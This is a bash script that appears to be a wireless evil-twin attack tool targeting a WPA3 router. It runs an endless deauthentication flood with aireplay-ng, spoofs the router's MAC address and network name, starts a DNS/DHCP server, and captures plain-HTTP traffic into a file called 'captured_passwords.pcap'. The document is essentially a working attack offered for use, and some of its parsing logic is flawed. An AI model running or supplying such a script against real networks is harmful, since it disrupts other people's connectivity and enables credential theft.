#!/bin/bash

read -p "Enter the name of the interface (e.g., wlan0): " interface
read -p "Enter the BSSID of the WPA3 Router: " bssid
read -p "Enter the name of the WPA3 Router: " router_name


current_mac=$(iwconfig $interface | grep $bssid | awk '{print $5}')
current_essid=$(iwconfig $interface | grep $bssid | awk '{print $4}' | cut -d '"' -f 2)

gnome-terminal -- aireplay-ng --deauth 0 -a $bssid $interface &

sudo ifconfig $interface down

sudo ifconfig $interface hw ether $current_mac
sudo iwconfig $interface essid "$current_essid"

sudo ifconfig $interface up

gnome-terminal -- dnsmasq -C /etc/dnsmasq.conf -d &


password_captured=false
while [ "$password_captured" = false ]; do
    sudo tcpdump -i $interface -w captured_passwords.pcap -c 1 port 80 and host not $(hostname -I | awk '{print $1}')
    if [ -s "captured_passwords.pcap" ]; then
        password_captured=true
    fi
done


